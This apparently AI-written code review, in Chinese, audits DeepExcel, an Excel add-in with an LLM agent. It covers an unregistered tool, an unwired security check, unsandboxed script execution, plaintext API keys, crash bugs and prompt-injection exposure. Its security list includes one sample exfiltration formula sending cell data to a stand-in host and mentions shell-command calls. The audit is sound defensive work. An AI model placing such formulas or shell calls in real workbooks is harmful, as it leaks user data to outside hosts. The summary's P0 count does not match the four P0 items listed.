# DeepExcel 对抗式审查报告（4 视角交叉验证）

## 跨审查交叉验证（多 agent 独立发现同一问题 = 高置信度 P0）

### 🔴 P0-1 `write_value` 工具未注册到 MCP server（3 个 agent 同时命中）
- [excel_tools.py:309-327](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.Sidecar/excel_tools.py) `register_all_tools()` 返回列表漏掉 `write_value`
- [sidecar.py:231](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.Sidecar/sidecar.py) `allowed_tools` 含 `write_value`，[system_prompt.py:21-25](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.Sidecar/system_prompt.py) 强制要求"写文本必须用 write_value"
- **直接对应 2026-06-29 用户投诉**："写入文本需写成 =\"张三\" 格式而非直接写张三"
- **修复**：`register_all_tools()` 加一行 `write_value,`

### 🔴 P0-2 `SecurityGateway` 完全未接线，二次验证机制形同虚设
- [SecurityGateway.cs](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.AddIn/Security/SecurityGateway.cs) 定义了高风险工具二次验证，但全局无任何位置调用 `ExecuteWithSecurityCheck`
- [PythonSidecar.cs:283-345](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.AddIn/Sidecar/PythonSidecar.cs) `HandleToolCall → ToolDispatcher.Execute` 直接调用 `execute_vba`/`execute_python`
- 与 P0-3 联动 = LLM 可执行任意系统命令

### 🔴 P0-3 `execute_python` / `execute_vba` 无沙箱
- [PythonExecutor.cs:258-301](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.AddIn/Executor/PythonExecutor.cs) `BuildScriptWithContext` 直接 `AppendLine(userCode)`，可 `import os; os.system(...)`
- [VBAExecutor.cs:159-169](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.AddIn/Executor/VBAExecutor.cs) 可 `Shell` / `CreateObject("WScript.Shell")` 写注册表

### 🔴 P0-4 API Key 明文存储于 config.json，DPAPI 加密路径是死代码
- [AppConfig.cs:192-200](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.AddIn/Config/AppConfig.cs) `UpdateApiKey` 直接写明文
- `SecurityManager.SaveApiKey` 从未被调用，[MessageBridge.cs:111-116](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.AddIn/Bridge/MessageBridge.cs) fallback 到明文 `provider.ApiKey`

---

## 可靠性问题（崩溃级）

### C-1 `HandleToolCall` 是 `async void` 且 `SendToolResult` 在 try-catch 之外
- [PythonSidecar.cs:283-345](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.AddIn/Sidecar/PythonSidecar.cs) 未捕获异常 → `AppDomain.UnhandledException` → Excel 崩溃

### C-2 `_uiControl.Invoke` 同步阻塞 → Excel 模态对话框时死锁
- [PythonSidecar.cs:308-318](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.AddIn/Sidecar/PythonSidecar.cs) 用户开"另存为"对话框时 UI 线程阻塞 → sidecar stdout 写入阻塞 → 整条链路卡死

### C-3 `foreach (Range cell in range.Cells)` 不释放 RCW → COM 句柄耗尽
- [ToolDispatcher.cs:592](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.AddIn/Sidecar/ToolDispatcher.cs)、[DataCleaner.cs:33,138,176,214,263](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.AddIn/Tools/DataCleaner.cs) 9 处循环不 `Marshal.ReleaseComObject`
- 10000×10 单元格操作即可耗尽 65536 句柄上限

### C-4 sidecar 进程退出无 `_process.Exited` 订阅 → `stream_end` 永不发送
- [PythonSidecar.cs:80-87](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.AddIn/Sidecar/PythonSidecar.cs) sidecar 崩溃时 `OnStdoutLine` EOF 直接 return，前端永久转圈 5 分钟

### C-5 `MessageBridge` 全部 JSON 序列化未用 `_jsonOptions` → 2D 数组崩溃隐患
- [MessageBridge.cs:147,339-357](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.AddIn/Bridge/MessageBridge.cs) 直接违反 memory "CRITICAL: System.Text.Json 不支持二维数组序列化"
- 当前前端只发 `user_message`/`cancel` 未触发，但是定时炸弹

---

## 协议与 Agent Loop 问题

### P-1 `apply_conditional_format` 的 `rule_args` JsonElement 未转换，静默丢弃
- [ToolDispatcher.cs:286-290](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.AddIn/Sidecar/ToolDispatcher.cs) `as Dictionary<string, object>` 失败返回 null
- LLM 指定的 `operator`/`value`/`n` 全部丢弃，强制用默认值，工具返回 `success=true` → 静默错误

### P-2 cancel 不清理 `_pendingClarifyQuestion` → 下一条用户消息被吞
- [MessageBridge.cs:327-332](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.AddIn/Bridge/MessageBridge.cs) `HandleCancel` 不清标志位
- clarify 弹窗后点停止 → 重新输入消息被误当 `clarify_answer` 吞掉

### P-3 `_wrap_result` 不设 `is_error=true` → LLM 死循环重试失败工具
- [excel_tools.py:7-13](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.Sidecar/excel_tools.py) C# `success=false` 时仍返回普通 text content
- 配合 P0-1 必然触发：每次写文本失败 → LLM 重试 → max_turns=20 浪费完

### P-4 `{excel_context}` 占位符从未被替换 + `session_id`/`context` 字段被 sidecar 丢弃
- [sidecar.py:245](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.Sidecar/sidecar.py) `system_prompt=SYSTEM_PROMPT` 直传常量
- [sidecar.py:130](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.Sidecar/sidecar.py) 只取 `msg.get("text", "")`，C# 构建的 context 完全丢失
- LLM 对当前 Excel 状态一无所知

### P-5 `call_csharp` 无超时 → C# 卡死时 sidecar 永久 hang
- [ipc.py:108-116](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.Sidecar/ipc.py) `while True: await asyncio.sleep(0.05)` 无超时

---

## 安全加固问题

- **H1** [MessageBridge.cs:158-159](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.AddIn/Bridge/MessageBridge.cs) 前端可直接发 `execute_vba`/`execute_tool` 绕过 LLM，无白名单校验
- **H2** `write_formula` 无公式黑名单 → `=WEBSERVICE("http://evil.com/?d="&A1)` 可外泄数据
- **H3** [system_prompt.py](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.Sidecar/system_prompt.py) 无 prompt 注入防御条款，read_range 返回内容直接成 LLM 上下文
- **H4** [SecurityManager.cs:46,64](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.AddIn/Security/SecurityManager.cs) DPAPI 失败 fail-open 回退明文
- **H5** `GenerateVerificationCode` 用非加密 `Random`，可预测

---

## 推荐修复顺序

| 优先级 | 问题 | 修复成本 | 阻断用户场景 |
|---|---|---|---|
| **P0-1** | write_value 未注册 | 1 行 | 文本写入必失败（用户已投诉）|
| **P0-4** | API Key 明文 | 中 | 密钥窃取 |
| **P0-2** | SecurityGateway 接线 | 低 | 高风险操作无验证 |
| **P0-3** | 沙箱化 execute_python/vba | 高 | LLM 任意 RCE |
| **C-1/C-2** | HandleToolCall 异常+死锁 | 中 | Excel 崩溃 |
| **C-4** | process.Exited 订阅 | 低 | UI 永久转圈 |
| **P-2** | cancel 清理 clarify 状态 | 1 行 | 吞用户消息 |
| **P-1** | rule_args JsonElement 转换 | 低 | 条件格式静默错误 |
| **C-5** | MessageBridge 用 _jsonOptions | 中 | 2D 数组崩溃 |
| **P-3** | _wrap_result 设 is_error | 低 | LLM 死循环重试 |

四个 agent 共发现 **3 个 P0**（write_value/SecurityGateway/API Key）+ **5 个崩溃级可靠性问题** + **5 个协议/Agent Loop 问题** + **5 个安全加固问题**。其中 P0-1 直接对应今天用户投诉，建议立即修复。

需要我直接动手修复哪几个？建议从 P0-1（write_value 一行修复）和 P-2（cancel 状态一行修复）这两个最高 ROI 修复开始。